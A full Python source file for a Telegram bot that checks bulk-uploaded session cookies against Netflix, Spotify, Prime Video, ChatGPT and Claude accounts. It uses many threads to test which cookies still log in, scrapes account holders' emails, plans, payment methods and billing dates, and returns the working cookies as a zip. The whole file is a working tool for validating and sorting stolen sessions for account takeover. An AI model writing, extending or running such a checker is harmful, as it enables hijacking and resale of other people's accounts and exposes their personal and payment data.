"""
Multi-Platform Cookie Checker Bot
Platforms: Netflix, Spotify, Prime Video, ChatGPT, Claude AI
Single-file version — no subfolders needed
"""
import os
import io
import sys
import json
import re
import zipfile
import threading
import time
from queue import Queue
from typing import Optional

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import telebot
from telebot.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from dotenv import load_dotenv

load_dotenv()

# ─── Config ───────────────────────────────────────────────────────────────────

BOT_TOKEN   = os.getenv("BOT_TOKEN", "").strip()
MAX_THREADS = int(os.getenv("MAX_THREADS", "30"))
TIMEOUT     = int(os.getenv("TIMEOUT", "18"))

if not BOT_TOKEN:
    print("=" * 55)
    print("ERROR: BOT_TOKEN environment variable is not set!")
    print("Add it in Logs & Settings > Environment Variables")
    print("=" * 55)
    sys.exit(1)

# ─── Base helpers ─────────────────────────────────────────────────────────────

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) "
      "Gecko/20100101 Firefox/132.0")

def _adapter():
    retry = Retry(total=2, backoff_factor=0.3,
                  status_forcelist=[500,502,503,504],
                  allowed_methods=["GET","POST"], raise_on_status=False)
    return HTTPAdapter(max_retries=retry, pool_connections=20,
                       pool_maxsize=50, pool_block=False)

def new_session(cookies: dict, extra_headers: Optional[dict] = None) -> requests.Session:
    s = requests.Session()
    s.mount("https://", _adapter())
    s.mount("http://",  _adapter())
    s.headers.update({"User-Agent": UA, "Accept-Language": "en-US,en;q=0.9",
                       "Accept-Encoding": "identity"})
    if extra_headers:
        s.headers.update(extra_headers)
    s.cookies.update(cookies)
    return s

def parse_netscape(content: str) -> dict:
    cookies = {}
    for line in content.strip().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7:
            cookies[parts[5].strip()] = parts[6].strip()
    return cookies

def parse_json_cookies(content: str) -> dict:
    cookies = {}
    try:
        data = json.loads(content)
        if isinstance(data, list):
            for item in data:
                name = item.get("name",""); value = item.get("value","")
                if name: cookies[name] = value
    except Exception:
        pass
    return cookies

def parse_cookies(content: str) -> dict:
    s = content.strip()
    if s.startswith("["):
        r = parse_json_cookies(s)
        if r: return r
    if "\t" in s:
        return parse_netscape(s)
    cookies = {}
    for part in s.split(";"):
        part = part.strip()
        if "=" in part:
            k, v = part.split("=", 1)
            cookies[k.strip()] = v.strip()
    return cookies

def make_result(file, raw, status, message, extra=None):
    r = {"file": file, "raw_content": raw, "status": status, "message": message}
    if extra: r.update(extra)
    return r

def rex(text: str, *patterns, flags=re.IGNORECASE) -> str:
    combined = text.replace('\\"','"').replace("&quot;",'"')
    for pat in patterns:
        m = re.search(pat, combined, flags)
        if m: return m.group(1).strip()
    return ""

# ─── Spotify Checker ──────────────────────────────────────────────────────────

_SP_OVERVIEW_URLS = [
    "https://www.spotify.com/us/account/overview/?utm_source=spotify&utm_medium=menu&utm_campaign=your_account",
    "https://www.spotify.com/account/overview/?utm_source=spotify&utm_medium=menu&utm_campaign=your_account",
]
_SP_PROFILE_URL = "https://www.spotify.com/api/account-settings/v1/profile"
_SP_FAMILY_URL  = "https://www.spotify.com/api/family/v1/family/home"
_SP_OVH = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language":"en-US,en;q=0.5","Cache-Control":"no-cache",
            "Upgrade-Insecure-Requests":"1"}
_SP_PRH = {"Accept":"application/json, text/plain, */*","Accept-Language":"en-US,en;q=0.5",
            "Cache-Control":"no-cache","Referer":"https://www.spotify.com/account/profile/"}

def _sp_plan(plan_name):
    p = (plan_name or "").lower()
    if "family" in p and "basic" in p: return "family_basic","Family Basic"
    if "family" in p:                  return "family_premium_v2","Family Premium"
    if "duo" in p:                     return "duo_premium","Duo Premium"
    if "student" in p and "hulu" in p: return "student_hulu","Student + Hulu"
    if "student" in p:                 return "student_premium","Student Premium"
    if "mini" in p:                    return "premium_mini","Premium Mini"
    if "basic" in p:                   return "basic_premium","Premium Basic"
    if "premium" in p:                 return "premium","Premium"
    if "free" in p or not p:           return "free","Free"
    return "unknown", plan_name or "Unknown"

def _sp_parse(html):
    src = html.replace('\\"','"').replace("&quot;",'"')
    c = html+"\n"+src
    logged_in = ('loggedIn\\":true' in html or '"loggedIn":true' in src or '"isLoggedInUser":true' in src)
    return {
        "loggedIn":    logged_in,
        "planName":    rex(c, r'planName\\":\\"([^"]+)', r'"planName":"([^"]+)"'),
        "country":     (rex(c,r'country\\":\\"([A-Za-z]{2})',r'"country":"([A-Za-z]{2})"',
                            r'countryCode\\":\\"([A-Za-z]{2})',r'"countryCode":"([A-Za-z]{2})"') or "").upper(),
        "email":       rex(c,r'email\\":\\"([^"]+)',r'"email":"([^"]+)"'),
        "isSubAccount":rex(c,r'isSubAccount\\":(true|false)',r'"isSubAccount":(true|false)'),
        "isTrial":     rex(c,r'isTrialUser\\":(true|false)',r'"isTrialUser":(true|false)') == "true",
        "inviteLink":  rex(c,r'inviteLink\\":\\"([^"]+)',r'"inviteLink":"([^"]+)"'),
        "freeSlots":   rex(c,r'freeSlots\\":\s*(\d+)',r'"freeSlots":\s*(\d+)'),
        "nextPayment": rex(c,r'nextPaymentDate\\":\\"([^"]+)',r'"nextPaymentDate":"([^"]+)"'),
    }

def check_spotify(content, filename):
    cookies = parse_cookies(content)
    if not cookies.get("sp_dc") and not cookies.get("sp_key"):
        return make_result(filename, content, "INVALID", "Missing sp_dc cookie")
    s = new_session(cookies, _SP_OVH)
    try:
        resp = None
        last = None
        for url in _SP_OVERVIEW_URLS:
            r = s.get(url, timeout=TIMEOUT)
            last = r.status_code
            if r.status_code == 403: return make_result(filename,content,"BANNED","403 — Banned")
            if r.status_code == 429: return make_result(filename,content,"RATE_LIMITED","Rate limited")
            if r.status_code == 200: resp = r; break
        if resp is None:
            return make_result(filename,content,"INVALID",f"Overview failed HTTP {last}")
        data = _sp_parse(resp.text)
        if not data["loggedIn"]:
            return make_result(filename,content,"INVALID","Not logged in — cookie expired")
        pk, pd = _sp_plan(data["planName"])
        extra = {"plan":pd,"country":data["country"]}
        if data["email"]:       extra["email"]        = data["email"]
        if data["isTrial"]:     extra["trial"]        = "Yes"
        if data["nextPayment"]: extra["next_billing"] = data["nextPayment"]
        if not extra.get("email"):
            try:
                pr = s.get(_SP_PROFILE_URL, headers=_SP_PRH, timeout=TIMEOUT, allow_redirects=False)
                if pr.status_code == 200:
                    pj = pr.json(); ps = pj.get("profile",{})
                    extra["email"] = ps.get("email") or pj.get("email","")
                    extra["name"]  = ps.get("name")  or pj.get("name","")
            except Exception: pass
        if pk in ("family_premium_v2","family_basic","duo_premium"):
            try:
                fr = s.get(_SP_FAMILY_URL, headers=_SP_PRH, timeout=TIMEOUT, allow_redirects=False)
                if fr.status_code == 200:
                    fj = fr.json()
                    if fj.get("isMaster",False):
                        extra["role"] = "Owner"
                        slots = fj.get("freeSlots") or data["freeSlots"]
                        if slots: extra["free_slots"] = str(slots)
                    else: extra["role"] = "Member"
            except Exception:
                if data["isSubAccount"]=="false": extra["role"]="Owner"
                elif data["isSubAccount"]=="true": extra["role"]="Member"
        return make_result(filename,content,"FREE" if pk=="free" else "VALID","Cookie working",extra)
    except requests.exceptions.Timeout:
        return make_result(filename,content,"TIMEOUT","Timed out")
    except Exception as e:
        return make_result(filename,content,"ERROR",str(e))

# ─── Netflix Checker ──────────────────────────────────────────────────────────

_NF_H = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
         "Accept-Language":"en-US,en;q=0.5","Cache-Control":"no-cache","Upgrade-Insecure-Requests":"1"}
_NF_SESS = ("NetflixId","SecureNetflixId","nfvdid","memclid")

def _nf_extract(html):
    src = html.replace('\\"','"').replace("&quot;",'"')
    c = html+"\n"+src
    return {
        "status":       rex(c,r'membershipStatus\\":\\"([^"]+)',r'"membershipStatus":"([^"]+)"'),
        "plan":         rex(c,r'planName\\":\\"([^"]+)',r'"planName":"([^"]+)"',
                            r'data-uia="plan-name"[^>]*>([^<]+)'),
        "email":        rex(c,r'email\\":\\"([^"@]+@[^"]+)',r'"email":"([^"@]+@[^"]+)"'),
        "country":      rex(c,r'countryOfSignup\\":\\"([A-Z]{2})',r'"countryOfSignup":"([A-Z]{2})"'),
        "max_streams":  rex(c,r'maxStreams\\":\s*(\d+)',r'"maxStreams":\s*(\d+)'),
        "quality":      rex(c,r'videoQuality\\":\\"([^"]+)',r'"videoQuality":"([^"]+)"'),
        "next_billing": rex(c,r'nextBillingDate\\":\\"([^"]+)',r'"nextBillingDate":"([^"]+)"'),
        "member_since": rex(c,r'memberSince\\":\\"([^"]+)',r'"memberSince":"([^"]+)"'),
        "payment":      rex(c,r'paymentMethod\\":\\"([^"]+)',r'"paymentMethod":"([^"]+)"'),
        "extra_members":rex(c,r'extraMembersEnabled\\":(true|false)',r'"extraMembersEnabled":(true|false)'),
        "profiles":     re.findall(r'"profileName"\s*:\s*"([^"]+)"', c)[:5],
    }

def check_netflix(content, filename):
    cookies = parse_cookies(content)
    if not any(cookies.get(k) for k in _NF_SESS):
        return make_result(filename,content,"INVALID","Missing NetflixId / SecureNetflixId cookie")
    s = new_session(cookies, _NF_H)
    try:
        r = s.get("https://www.netflix.com/account/membership", timeout=TIMEOUT, allow_redirects=True)
        url = r.url.lower()
        if "login" in url or "signup" in url:
            return make_result(filename,content,"INVALID","Redirected to login — cookie expired")
        if r.status_code == 403:
            return make_result(filename,content,"BANNED","403 — Account restricted")
        if r.status_code not in (200,302):
            return make_result(filename,content,"UNKNOWN",f"HTTP {r.status_code}")
        info = _nf_extract(r.text)
        ms = (info["status"] or "").upper()
        if ms in ("NEVER_MEMBER","FORMER_MEMBER"):
            return make_result(filename,content,"INVALID",f"Not a member ({ms})",{"membership":ms})
        extra = {}
        if info["email"]:         extra["email"]         = info["email"]
        if info["plan"]:          extra["plan"]          = info["plan"]
        if info["country"]:       extra["country"]       = info["country"]
        if info["max_streams"]:   extra["max_streams"]   = info["max_streams"]
        if info["quality"]:       extra["quality"]       = info["quality"]
        if info["next_billing"]:  extra["next_billing"]  = info["next_billing"]
        if info["member_since"]:  extra["member_since"]  = info["member_since"]
        if info["payment"]:       extra["payment"]       = info["payment"]
        if info["profiles"]:      extra["profiles"]      = ", ".join(info["profiles"])
        if info["extra_members"]: extra["extra_members"] = "Yes" if info["extra_members"]=="true" else "No"
        if ms:                    extra["membership"]    = ms
        return make_result(filename,content,"VALID","Cookie working",extra)
    except requests.exceptions.Timeout:
        return make_result(filename,content,"TIMEOUT","Timed out")
    except Exception as e:
        return make_result(filename,content,"ERROR",str(e))

# ─── Prime Video Checker ──────────────────────────────────────────────────────

_PV_URLS = ["https://www.primevideo.com/storefront/home",
            "https://www.primevideo.com/",
            "https://www.amazon.com/gp/video/storefront"]
_PV_H = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
         "Accept-Language":"en-US,en;q=0.5","Cache-Control":"no-cache","Upgrade-Insecure-Requests":"1"}
_PV_SESS = ["session-token","ubid-main","at-main","sess-at-main","x-main",
            "lc-main","session-id","ubid-acbuk","ubid-acbus"]
_PV_SIGNIN = ["signin","ap/signin","auth/signin","ap/register","sign-in"]

def _pv_parse(html):
    src = html.replace('\\"','"').replace("&quot;",'"')
    c = html+"\n"+src
    name = rex(c,r'"customerName"\s*:\s*"([^"]{2,60})"',
               r'class="[^"]*nav-line-1[^"]*"[^>]*>([^<]{2,40})<')
    return {
        "name":     "" if (not name or "sign" in name.lower()) else name,
        "country":  (rex(c,r'"countryCode"\s*:\s*"([A-Z]{2})"',
                         r'"marketplaceCountry"\s*:\s*"([^"]{2,5})"') or "").upper(),
        "profile":  rex(c,r'"activeProfile"[^}]*?"name"\s*:\s*"([^"]{1,50})"',
                        r'"profileName"\s*:\s*"([^"]{1,50})"'),
        "is_prime": any(k in c for k in ['"isPrime":true','"hasPrimeMembership":true','"PRIME"']),
        "is_free":  '"isPrime":false' in c or '"hasPrimeMembership":false' in c,
        "next_billing": rex(c,r'"nextBillingDate"\s*:\s*"([^"]+)"',r'"renewalDate"\s*:\s*"([^"]+)"'),
    }

def check_primevideo(content, filename):
    cookies = parse_cookies(content)
    if not any(cookies.get(k) for k in _PV_SESS):
        return make_result(filename,content,"INVALID","Missing session-token / at-main cookie")
    s = new_session(cookies, _PV_H)
    try:
        resp = None
        for url in _PV_URLS:
            try:
                r = s.get(url, timeout=TIMEOUT, allow_redirects=True)
                if any(m in r.url.lower() for m in _PV_SIGNIN): continue
                if r.status_code == 403: return make_result(filename,content,"BANNED","403 — Restricted")
                if r.status_code == 200:
                    if 'id="ap_email"' in r.text and "ap_password" in r.text: continue
                    resp = r; break
            except Exception: continue
        if resp is None:
            return make_result(filename,content,"INVALID","Redirected to sign-in — cookie expired")
        info = _pv_parse(resp.text)
        extra = {}
        if info["name"]:          extra["name"]         = info["name"]
        if info["country"]:       extra["country"]      = info["country"]
        if info["profile"]:       extra["profile"]      = info["profile"]
        if info["next_billing"]:  extra["next_billing"] = info["next_billing"]
        extra["plan"] = "Prime (Paid)" if info["is_prime"] else "Free / No Prime" if info["is_free"] else "Unknown"
        return make_result(filename,content,"VALID","Cookie working",extra)
    except requests.exceptions.Timeout:
        return make_result(filename,content,"TIMEOUT","Timed out")
    except Exception as e:
        return make_result(filename,content,"ERROR",str(e))

# ─── ChatGPT Checker ──────────────────────────────────────────────────────────

_GPT_H = {"Accept":"application/json","Accept-Language":"en-US,en;q=0.9",
          "Referer":"https://chatgpt.com/","Sec-Fetch-Site":"same-origin",
          "Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty"}

def _gpt_token(cookies):
    for key in ("__Secure-next-auth.session-token","next-auth.session-token"):
        v = cookies.get(key,"")
        if v: return v
    parts = {}
    for key, val in cookies.items():
        for prefix in ("__Secure-next-auth.session-token.","next-auth.session-token."):
            if key.startswith(prefix):
                suffix = key[len(prefix):]
                if suffix.isdigit(): parts[int(suffix)] = val
                break
    return "".join(v for _,v in sorted(parts.items()))

def check_chatgpt(content, filename):
    cookies = parse_cookies(content)
    token = _gpt_token(cookies)
    if not token:
        return make_result(filename,content,"INVALID","Missing __Secure-next-auth.session-token")
    s = new_session(cookies, _GPT_H)
    try:
        r = s.get("https://chatgpt.com/api/auth/session", timeout=TIMEOUT)
        if r.status_code == 401: return make_result(filename,content,"INVALID","Cookie expired (401)")
        if r.status_code == 403: return make_result(filename,content,"BANNED","Account restricted (403)")
        if r.status_code == 429: return make_result(filename,content,"RATE_LIMITED","Rate limited")
        if r.status_code != 200: return make_result(filename,content,"UNKNOWN",f"HTTP {r.status_code}")
        try: data = r.json()
        except Exception: return make_result(filename,content,"INVALID","Bad response")
        user = data.get("user")
        if not user: return make_result(filename,content,"INVALID","No user — cookie expired")
        extra = {"email":user.get("email",""),"name":user.get("name","")}
        at = data.get("accessToken","")
        if at:
            ah = {**_GPT_H,"Authorization":f"Bearer {at}"}
            try:
                me = requests.get("https://chatgpt.com/backend-api/me",headers=ah,timeout=TIMEOUT).json()
                extra["email"] = me.get("email") or extra["email"]
                extra["name"]  = me.get("name")  or extra["name"]
                orgs = me.get("orgs",{}).get("data",[])
                if orgs: extra["org"] = orgs[0].get("title","")
            except Exception: pass
            try:
                sub = requests.get("https://chatgpt.com/backend-api/accounts/check/v4-2023-04-27",headers=ah,timeout=TIMEOUT).json()
                for acc in sub.get("accounts",{}).values():
                    plan = acc.get("plan_type") or acc.get("entitlement",{}).get("subscription_plan","")
                    feats = acc.get("features",[])
                    if any(f in feats for f in ("gpt4","gpt4o","gpt-4")): extra["plan"] = "Plus / Pro"
                    elif plan: extra["plan"] = plan.replace("_"," ").title()
                    break
            except Exception: pass
        if not extra.get("plan"): extra["plan"] = "Free"
        return make_result(filename,content,"VALID","Cookie working",extra)
    except requests.exceptions.Timeout:
        return make_result(filename,content,"TIMEOUT","Timed out")
    except Exception as e:
        return make_result(filename,content,"ERROR",str(e))

# ─── Claude Checker ───────────────────────────────────────────────────────────

_CL_H = {"Accept":"application/json, text/plain, */*","Referer":"https://claude.ai/",
         "Origin":"https://claude.ai","Sec-Fetch-Site":"same-origin",
         "Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty"}

def check_claude(content, filename):
    cookies = parse_cookies(content)
    sk = cookies.get("sessionKey","")
    if not sk or not sk.startswith("sk-ant-"):
        return make_result(filename,content,"INVALID","Missing sessionKey (must start with sk-ant-)")
    s = new_session(cookies, _CL_H)
    try:
        r = s.get("https://claude.ai/api/organizations", timeout=TIMEOUT)
        if r.status_code == 401: return make_result(filename,content,"INVALID","Cookie expired (401)")
        if r.status_code == 403: return make_result(filename,content,"BANNED","Account suspended (403)")
        if r.status_code == 429: return make_result(filename,content,"RATE_LIMITED","Rate limited")
        if r.status_code != 200: return make_result(filename,content,"UNKNOWN",f"HTTP {r.status_code}")
        extra = {"session_key_preview":sk[:28]+"..."}
        try:
            orgs = r.json()
            if isinstance(orgs,list) and orgs:
                org = orgs[0]
                extra["org"]  = org.get("name","")
                tier  = org.get("billing_subscription_tier","")
                flags = org.get("active_flags",[])
                extra["plan"] = (tier.replace("_"," ").title() if tier
                                 else "Pro" if any("pro" in str(f).lower() for f in flags)
                                 else "Free")
                rl = org.get("rate_limit_tier","")
                if rl: extra["rate_limit_tier"] = rl
        except Exception: pass
        try:
            ra = s.get("https://claude.ai/api/account", timeout=TIMEOUT)
            if ra.status_code == 200:
                acc = ra.json()
                extra["email"] = acc.get("email_address","")
                extra["name"]  = acc.get("full_name") or acc.get("display_name") or ""
        except Exception: pass
        return make_result(filename,content,"VALID","Cookie working",extra)
    except requests.exceptions.Timeout:
        return make_result(filename,content,"TIMEOUT","Timed out")
    except Exception as e:
        return make_result(filename,content,"ERROR",str(e))

# ─── Platform registry ────────────────────────────────────────────────────────

PLATFORMS = {
    "netflix":    {"name":"Netflix",    "fn":check_netflix},
    "spotify":    {"name":"Spotify",    "fn":check_spotify},
    "primevideo": {"name":"Prime Video","fn":check_primevideo},
    "chatgpt":    {"name":"ChatGPT",    "fn":check_chatgpt},
    "claude":     {"name":"Claude AI",  "fn":check_claude},
}
PLATFORM_ICONS = {
    "netflix":"🎬","spotify":"🎵","primevideo":"📺","chatgpt":"💬","claude":"🤖"
}

# ─── Bot init ─────────────────────────────────────────────────────────────────

try:
    bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")
    me  = bot.get_me()
    print(f"[BOT] Connected as @{me.username} (id={me.id})")
    print(f"[BOT] Threads={MAX_THREADS} | Timeout={TIMEOUT}s")
except Exception as e:
    print(f"[BOT] FATAL: {e}")
    print("[BOT] Check your BOT_TOKEN!")
    sys.exit(1)

selected_platform: dict[int, str] = {}

# ─── Keyboard ─────────────────────────────────────────────────────────────────

def platform_keyboard() -> InlineKeyboardMarkup:
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(*[InlineKeyboardButton(f"{PLATFORM_ICONS[k]}  {v['name']}",
             callback_data=f"platform:{k}") for k,v in PLATFORMS.items()])
    return kb

# ─── Result formatting ────────────────────────────────────────────────────────

STATUS_INFO = {
    "VALID":("✅","WORKING"),"FREE":("🆓","FREE"),"INVALID":("❌","INVALID"),
    "BANNED":("⛔","BANNED"),"RATE_LIMITED":("⚠️","RATE LIMITED"),
    "TIMEOUT":("⏱","TIMEOUT"),"ERROR":("🔴","ERROR"),"UNKNOWN":("❓","UNKNOWN"),
}
EXTRA_LABELS = [
    ("email","📧 Email"),("name","👤 Name"),("org","🏢 Org"),("plan","💎 Plan"),
    ("country","🌍 Country"),("membership","🎫 Status"),("role","👑 Role"),
    ("profile","🎭 Profile"),("profiles","🎭 Profiles"),("max_streams","📺 Screens"),
    ("quality","🖥 Quality"),("next_billing","📅 Next Bill"),
    ("member_since","📆 Member Since"),("payment","💳 Payment"),
    ("extra_members","👥 Extra Members"),("free_slots","🪑 Free Slots"),
    ("invite_url","🔗 Invite"),("trial","🎁 Trial"),
    ("rate_limit_tier","⚡ Rate Tier"),("session_key_preview","🔑 Key"),
]

def format_result(r: dict) -> str:
    emoji, label = STATUS_INFO.get(r["status"],("❓",r["status"]))
    lines = [f"{emoji} *{label}*  ›  `{r['file']}`"]
    for key, lbl in EXTRA_LABELS:
        val = r.get(key,"")
        if val: lines.append(f"   {lbl}: {val}")
    if r["status"] not in ("VALID","FREE"):
        lines.append(f"   ℹ️ {r['message']}")
    return "\n".join(lines)

def chunk_list(lst, n):
    for i in range(0,len(lst),n): yield lst[i:i+n]

def safe_send(chat_id, text, retries=3):
    for attempt in range(retries):
        try:
            bot.send_message(chat_id, text[:4096], parse_mode="Markdown")
            return
        except telebot.apihelper.ApiTelegramException as e:
            if e.error_code == 429:
                wait = int(e.result_json.get("parameters", {}).get("retry_after", 10))
                time.sleep(wait + 1)
            else:
                try: bot.send_message(chat_id, text[:4096], parse_mode=None)
                except Exception: pass
                return
        except Exception:
            try: bot.send_message(chat_id, text[:4096], parse_mode=None)
            except Exception: pass
            return

def safe_edit(chat_id, msg_id, text, retries=3):
    for attempt in range(retries):
        try:
            bot.edit_message_text(text[:4096], chat_id, msg_id, parse_mode="Markdown")
            return
        except telebot.apihelper.ApiTelegramException as e:
            if e.error_code == 429:
                wait = int(e.result_json.get("parameters", {}).get("retry_after", 10))
                time.sleep(wait + 1)
            else:
                return
        except Exception:
            return

# ─── Progress UI ──────────────────────────────────────────────────────────────

def _bar(pct, width=12):
    filled = int(pct/100*width)
    return "▓"*filled + "░"*(width-filled)

def _progress_text(icon, name, total, done, valid, invalid, banned, errors, threads):
    pct = int(done/total*100) if total else 0
    return (
        f"{icon} *{name}*\n"
        f"┌─────────────────────────\n"
        f"│ `[{_bar(pct)}]` *{pct}%*\n"
        f"├─────────────────────────\n"
        f"│ 🔢 Total      `{total}`\n"
        f"│ ⏳ Done       `{done}` / `{total}`\n"
        f"│ 🔄 Remaining  `{total-done}`\n"
        f"├─────────────────────────\n"
        f"│ ✅ Valid      `{valid}`\n"
        f"│ ❌ Invalid    `{invalid}`\n"
        f"│ ⛔ Banned     `{banned}`\n"
        f"│ 🔴 Errors     `{errors}`\n"
        f"└─────────────────────────\n"
        f"⚡ *{threads}* threads · checking..."
    )

def _summary_text(icon, name, total, valid, invalid, banned, rate, errors):
    pct = int(valid/total*100) if total else 0
    return (
        f"{icon} *{name} — Done!*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 *Results*\n"
        f"  🔢 Total       `{total}`\n"
        f"  ✅ Working     `{valid}`  ({pct}%)\n"
        f"  ❌ Invalid     `{invalid}`\n"
        f"  ⛔ Banned      `{banned}`\n"
        f"  ⚠️  Rate Ltd    `{rate}`\n"
        f"  🔴 Errors      `{errors}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━"
    )

# ─── Threading ────────────────────────────────────────────────────────────────

def worker(q, results, lock, check_fn):
    while True:
        item = q.get()
        if item is None: q.task_done(); break
        fname, content = item
        result = check_fn(content, fname)
        with lock: results.append(result)
        q.task_done()

def run_checks(cookie_files, check_fn, chat_id, msg_id, icon, name):
    total = len(cookie_files); results = []; lock = threading.Lock()
    q = Queue(); all_done = threading.Event()
    for fname, content in cookie_files.items(): q.put((fname, content))
    tc = min(MAX_THREADS, total)
    threads = []
    for _ in range(tc):
        t = threading.Thread(target=worker, args=(q,results,lock,check_fn), daemon=True)
        t.start(); threads.append(t)
    def _wait(): q.join(); all_done.set()
    threading.Thread(target=_wait, daemon=True).start()
    last = -1
    while not all_done.is_set():
        with lock: done = len(results); snap = list(results)
        if done != last:
            last = done
            v = sum(1 for r in snap if r["status"] in ("VALID","FREE"))
            i = sum(1 for r in snap if r["status"]=="INVALID")
            b = sum(1 for r in snap if r["status"]=="BANNED")
            e = sum(1 for r in snap if r["status"] in ("ERROR","TIMEOUT","UNKNOWN","RATE_LIMITED"))
            safe_edit(chat_id, msg_id, _progress_text(icon,name,total,done,v,i,b,e,tc))
        all_done.wait(timeout=1.2)
    with lock: snap = list(results)
    v=sum(1 for r in snap if r["status"] in ("VALID","FREE"))
    i=sum(1 for r in snap if r["status"]=="INVALID")
    b=sum(1 for r in snap if r["status"]=="BANNED")
    e=sum(1 for r in snap if r["status"] in ("ERROR","TIMEOUT","UNKNOWN","RATE_LIMITED"))
    safe_edit(chat_id, msg_id, _progress_text(icon,name,total,total,v,i,b,e,tc))
    for _ in threads: q.put(None)
    for t in threads: t.join(timeout=5)
    return results

def build_zip(valid):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf,"w",zipfile.ZIP_DEFLATED) as zf:
        for r in valid: zf.writestr(r["file"],r["raw_content"])
    buf.seek(0); return buf

# ─── Handlers ────────────────────────────────────────────────────────────────

@bot.message_handler(commands=["start","help"])
def handle_start(message: Message):
    bot.send_message(message.chat.id,
        "👋 *Cookie Checker Bot*\n\n"
        "_Netflix · Spotify · Prime · ChatGPT · Claude_\n\n"
        "🔽 *Select a platform to begin:*",
        reply_markup=platform_keyboard())

@bot.message_handler(commands=["check"])
def handle_check(message: Message):
    bot.send_message(message.chat.id,"🔽 *Select platform:*",reply_markup=platform_keyboard())

@bot.callback_query_handler(func=lambda c: c.data.startswith("platform:"))
def handle_platform(call: CallbackQuery):
    uid = call.from_user.id
    key = call.data.split(":",1)[1]
    if key not in PLATFORMS:
        bot.answer_callback_query(call.id,"❌ Unknown platform"); return
    p = PLATFORMS[key]; icon = PLATFORM_ICONS[key]
    bot.answer_callback_query(call.id,f"{p['name']} selected ✅")
    selected_platform[uid] = key
    bot.edit_message_text(
        f"{icon} *{p['name']}* selected ✅\n\n"
        f"📦 Send a `.zip` file with cookie `.txt` files\n"
        f"_Formats: Netscape (tab-separated) or JSON array_\n\n"
        f"↩️ Change platform: /check",
        call.message.chat.id, call.message.message_id)

@bot.message_handler(content_types=["document"])
def handle_document(message: Message):
    uid = message.from_user.id
    doc = message.document
    if not doc.file_name.lower().endswith(".zip"):
        bot.reply_to(message,"❌ Please send a `.zip` file only."); return
    if uid not in selected_platform:
        bot.reply_to(message,"⚠️ Select a platform first:",reply_markup=platform_keyboard()); return
    platform_key = selected_platform.pop(uid)
    platform = PLATFORMS[platform_key]; icon = PLATFORM_ICONS[platform_key]
    status_msg = bot.reply_to(message,"⬇️ Downloading zip...")
    try:
        fi = bot.get_file(doc.file_id); raw = bot.download_file(fi.file_path)
    except Exception as e:
        safe_edit(message.chat.id, status_msg.message_id, f"❌ Download failed: {e}"); return
    try:
        zf = zipfile.ZipFile(io.BytesIO(raw)); names = zf.namelist()
    except zipfile.BadZipFile:
        safe_edit(message.chat.id, status_msg.message_id,"❌ Invalid zip file."); return
    cookie_names = [n for n in names if n.lower().endswith(".txt") and not n.startswith("__MACOSX")]
    if not cookie_names:
        safe_edit(message.chat.id, status_msg.message_id,"❌ No `.txt` cookie files found in zip."); return
    tc = min(MAX_THREADS, len(cookie_names))
    safe_edit(message.chat.id, status_msg.message_id,
              f"{icon} *{platform['name']}* — `{len(cookie_names)}` files found\n"
              f"⚡ Starting with `{tc}` threads...")

    def do_check():
        try:
            cookie_files = {}
            for n in cookie_names:
                try:
                    cookie_files[os.path.basename(n)] = zf.read(n).decode("utf-8",errors="ignore")
                except Exception: pass
            total = len(cookie_files)
            results = run_checks(cookie_files, platform["fn"],
                                 message.chat.id, status_msg.message_id,
                                 icon, platform["name"])
            valid   = [r for r in results if r["status"] in ("VALID","FREE")]
            invalid = [r for r in results if r["status"]=="INVALID"]
            banned  = [r for r in results if r["status"]=="BANNED"]
            rate    = [r for r in results if r["status"]=="RATE_LIMITED"]
            errors  = [r for r in results if r["status"] in ("ERROR","TIMEOUT","UNKNOWN")]
            safe_edit(message.chat.id, status_msg.message_id,
                      _summary_text(icon,platform["name"],total,
                                    len(valid),len(invalid),len(banned),len(rate),len(errors)))
            time.sleep(0.5)
            if valid:
                safe_send(message.chat.id, f"✅ *WORKING COOKIES ({len(valid)}/{total})*\n{'─'*28}")
                for batch in chunk_list(valid,5):
                    safe_send(message.chat.id, "\n\n".join(format_result(r) for r in batch))
                    time.sleep(0.3)
            if valid:
                zip_buf = build_zip(valid)
                lines = [f"📦 {platform['name']} — Working Cookies ({len(valid)}/{total})\n"]
                for r in valid:
                    parts = [p for p in [r.get("email"),r.get("plan"),r.get("country")] if p]
                    info = "  |  ".join(parts)
                    lines.append(f"✅ {r['file']}" + (f"\n     {info}" if info else ""))
                lines.append("\n/check — check more cookies")
                try:
                    bot.send_document(message.chat.id,
                                      (f"{platform_key}_working_cookies.zip", zip_buf),
                                      caption="\n".join(lines)[:1020])
                except Exception as e:
                    safe_send(message.chat.id, f"Zip send nahi hua: {e}")
            else:
                safe_send(message.chat.id,
                          f"😔 *No working {platform['name']} cookies found.*\n\nTry different cookies · /check")
        except Exception as e:
            safe_send(message.chat.id, f"🔴 Fatal error: {e}")

    threading.Thread(target=do_check, daemon=True).start()

# ─── Launch ───────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("[BOT] Polling...")
    bot.infinity_polling(timeout=30, long_polling_timeout=20)
